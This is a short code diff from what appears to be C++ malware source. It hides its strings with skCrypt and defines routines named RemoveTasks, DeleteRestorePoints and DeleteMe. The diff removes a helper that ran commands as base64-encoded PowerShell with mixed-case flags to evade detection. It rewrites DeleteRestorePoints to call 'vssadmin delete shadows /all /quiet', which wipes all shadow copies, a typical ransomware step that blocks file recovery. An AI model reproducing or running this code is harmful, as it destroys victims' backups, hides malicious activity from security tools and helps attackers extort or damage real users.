@@ -2,9 +2,6 @@
 
 using namespace std;
 
-string RunEncCommand(const string& cmd) {
-    return (string)skCrypt("powershell -enCoDEdcOmmAnD ") + Exec(((string)skCrypt("powershell [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(\\\"") + cmd + (string)skCrypt("\\\"))")).c_str());
-}
 
 string GenerateRandom(const int len) {
     timeval time;
@@ -57,7 +54,8 @@ void RemoveTasks() {
 }
 
 void DeleteRestorePoints() {
-    system(RunEncCommand((string)skCrypt("vssadmin delete shadows /all /quiet")).c_str());
+	system(skCrypt("vssadmin delete shadows /all /quiet"));
+    // Automatically encoded during precompilation
 }
 
 void DeleteMe(const string& myPath) {
